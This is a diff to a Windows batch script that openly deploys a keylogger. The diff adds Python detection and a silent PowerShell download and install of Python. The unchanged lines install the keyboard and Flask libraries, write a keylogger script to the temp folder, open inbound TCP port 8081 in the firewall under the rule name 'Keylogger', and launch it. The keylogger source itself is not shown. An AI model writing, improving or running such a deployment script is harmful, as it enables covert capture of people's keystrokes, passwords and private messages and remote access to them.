@@ -5,8 +5,25 @@ if %errorLevel% neq 0 (
     exit /b
 )
 
+echo Detecting Python installation...
+set PYTHON_EXE=
+if exist "C:\Program Files\Python311\python.exe" set PYTHON_EXE=C:\Program Files\Python311\python.exe
+if exist "C:\Program Files\Python312\python.exe" set PYTHON_EXE=C:\Program Files\Python312\python.exe
+if exist "C:\Python311\python.exe" set PYTHON_EXE=C:\Python311\python.exe
+if exist "C:\Python312\python.exe" set PYTHON_EXE=C:\Python312\python.exe
+for /f "delims=" %%i in ('where python 2^>nul') do set PYTHON_EXE=%%i
+
+if "%PYTHON_EXE%"=="" (
+    echo Python not found - installing...
+    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '%TEMP%\python-installer.exe' -UseBasicParsing; Start-Process -FilePath '%TEMP%\python-installer.exe' -ArgumentList '/quiet','InstallAllUsers=1','PrependPath=1','Include_pip=1' -Wait; Remove-Item '%TEMP%\python-installer.exe'"
+    set PYTHON_EXE=C:\Program Files\Python311\python.exe
+    timeout /t 5 /nobreak >nul
+)
+
+echo Using Python: %PYTHON_EXE%
+
 echo Installing Python dependencies...
-"C:\Program Files\Python311\python.exe" -m pip install keyboard flask flask-socketio --quiet 2>nul
+"%PYTHON_EXE%" -m pip install keyboard flask flask-socketio --quiet 2>nul
 
 echo Creating keylogger script...
 (
@@ -118,7 +135,7 @@ echo Adding firewall rule...
 netsh advfirewall firewall add rule name="Keylogger" dir=in action=allow protocol=TCP localport=8081 >nul 2>&1
 
 echo Starting keylogger...
-start "Keylogger" "C:\Program Files\Python311\python.exe" "%TEMP%\kl.py"
+start "Keylogger" "%PYTHON_EXE%" "%TEMP%\kl.py"
 
 echo.
 echo ====================================
